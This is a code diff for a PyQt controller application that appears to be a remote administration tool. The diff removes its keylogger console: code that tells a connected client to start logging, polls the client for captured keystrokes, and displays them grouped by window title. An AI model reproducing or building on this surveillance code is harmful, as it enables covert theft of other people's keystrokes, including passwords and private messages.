@@ -73,8 +73,6 @@ class MainDialog(QWidget, gui.Ui_Form):
         self.explorerPathEntry.returnPressed.connect(self.openPath)
         self.executeButton.clicked.connect(self.executeScript)
         self.clearoutputButton.clicked.connect(self.clearOutput)
-        self.startloggingButton.clicked.connect(self.Keylogging)
-        self.stoploggingButton.clicked.connect(self.Stoplogging)
         self.connect(self, SIGNAL('triggered()'), self.closeEvent)
 
         self.connect(self.tabWidget, SIGNAL('currentChanged(int)'), self.tabDetector)
@@ -109,115 +107,6 @@ class MainDialog(QWidget, gui.Ui_Form):
             self.explorerGetlist()
 
     # END: TabWidget functions
-
-
-    # START: Keylogger
-
-    def Keylogging(self):
-
-        self.KeyLoggingState = True
-        self.KeyStokes = {}
-        self.BObjects = {}
-        self.activeWindowTitle = None
-
-        # Turn off tabs
-        self.tabWidget.setTabEnabled(0, False)
-        self.tabWidget.setTabEnabled(1, False)
-        self.tabWidget.setTabEnabled(2, False)
-        self.tabWidget.setCurrentIndex(3)
-
-        self.Send('StartLogging')
-        self.Receive()
-
-        def Code_filter(key):
-            if keycodes.keycodes.has_key(key):
-                return keycodes.keycodes[key]
-            else:
-                return chr(int(key))
-
-
-        while self.KeyLoggingState:
-            time.sleep(0.1)
-            self.gui()
-            self.Send('GiveMeKeyStokes')
-            try:
-                data = ast.literal_eval(self.Receive().split('\n')[-1])
-            except socket.error:
-                pass
-            for title, key in data.iteritems():
-                for char in key.split(' '):
-                    if self.KeyStokes.has_key(title):
-                        self.KeyStokes[title] += Code_filter(char)
-                    else:
-                         self.KeyStokes[title] = Code_filter(char)
-                for key, val in self.BObjects.iteritems():
-                    button = self.findChild(QPushButton, key)
-                    button.setStyleSheet(self.Styles(key, False))
-                    if val == title:
-                        button = self.findChild(QPushButton, key)
-                        button.setStyleSheet(self.Styles(key, True))
-
-            self.UpdateKeyloggerGUI()
-
-    def Styles(self, ObjName, active=False):
-        return '''
-            QPushButton#%s {
-            background: #194759;
-            color: #fafafa;
-            font-size: 14px;
-            border: solid #00bbff 2px;
-            border-radius: none;
-            text-decoration: none;
-            background-color: qlineargradient(spread:pad, x1:1, y1:1, x2:0, y2:0, stop:0 %s, stop:1 %s);
-            }
-            QPushButton#%s:hover {
-            background: #1f5a70;
-            background-color: qlineargradient(spread:pad, x1:1, y1:1, x2:0, y2:0, stop:0 %s, stop:1 %s);
-            }
-            ''' % (ObjName, '#194759' if not active else '#3e7015', '#1f5a70' if not active else '#50911b',
-                   ObjName, '#194759' if not active else '#3e7015', '#1f5a70' if not active else '#50911b')
-
-    def UpdateKeyloggerGUI(self):
-
-        def FindObjByName(ObjName):
-            self.activeWindowTitle = ObjName
-
-        def GenerateName(size=10, chars=string.ascii_uppercase):
-            return ''.join(random.choice(chars) for _ in range(size))
-
-        def CreateButton(ObjName, Text):
-            self.BObjects[ObjName] = Text
-            if len(Text) > 20:
-                self.TempButton = QPushButton(Text[:17]+'...', self)
-            else:
-                self.TempButton = QPushButton(Text, self)
-            self.TempButton.setObjectName(ObjName)
-            self.TempButton.setMinimumSize(QSize(200, 20))
-            self.TempButton.setMaximumSize(QSize(200, 20))
-            self.TempButton.setStyleSheet(self.Styles(ObjName, False))
-
-            self.connect(self.TempButton, SIGNAL('clicked()'), lambda: FindObjByName(ObjName))
-            self.windowsnamesLayout.addWidget(self.TempButton)
-            self.windowsnamesLayout.setAlignment(Qt.AlignTop)
-
-        for title, keystokes in self.KeyStokes.iteritems():
-            if title not in self.BObjects.values():
-                ObjName = GenerateName()
-                CreateButton(ObjName, title)
-
-        if self.activeWindowTitle:
-            self.keystokesText.setText('<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">%s</font></p><br>'
-                                       % self.BObjects[self.activeWindowTitle] + self.KeyStokes[self.BObjects[self.activeWindowTitle]])
-
-    def Stoplogging(self):
-        self.KeyLoggingState = False
-        self.Send('StopLogging')
-        self.startloggingButton.setChecked(False)
-        self.tabWidget.setTabEnabled(0, True)
-        self.tabWidget.setTabEnabled(1, True)
-        self.tabWidget.setTabEnabled(2, True)
-
-    # END: Keylogger
     
     # START: socket functions
     # listen for clients
